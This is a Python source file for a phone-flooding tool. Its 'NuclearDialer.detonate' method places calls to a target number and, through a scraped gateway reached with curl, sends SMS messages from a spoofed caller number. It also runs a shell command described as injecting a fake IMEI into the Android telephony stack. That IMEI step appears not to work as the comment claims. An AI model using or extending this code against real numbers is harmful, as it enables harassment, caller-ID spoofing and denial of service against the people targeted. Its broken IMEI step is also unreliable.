# core/call_flood.py  
import subprocess  
import random  
from core.tor_scraper import TorScraper  
from core.spoof_engine import GhostSpoof  

class NuclearDialer:  
    def __init__(self):  
        self.scraper = TorScraper()  
        self.spoofer = GhostSpoof()  # Initialize spoof engine  

    def detonate(self, target):  
        gateway = self.scraper.get_gateway(target[:2])  
        spoofed_num = self.spoofer.generate()  # Use ghost spoof  
        # Inject fake IMEI into Android telephony stack  
        subprocess.run(  
            f"termux-telephony-deviceinfo --imei {self.spoofer.override_imei()}",  
            shell=True,  
            capture_output=True  
        )  
        # Launch dual flood  
        subprocess.Popen(  
            f"termux-telephony-call {target}",  
            shell=True,  
            stdout=subprocess.DEVNULL  
        )  
        subprocess.Popen(  
            f"curl -s -X POST {gateway} --data 'to={target}&from={spoofed_num}'",  
            shell=True,  
            stdout=subprocess.DEVNULL  
        )  
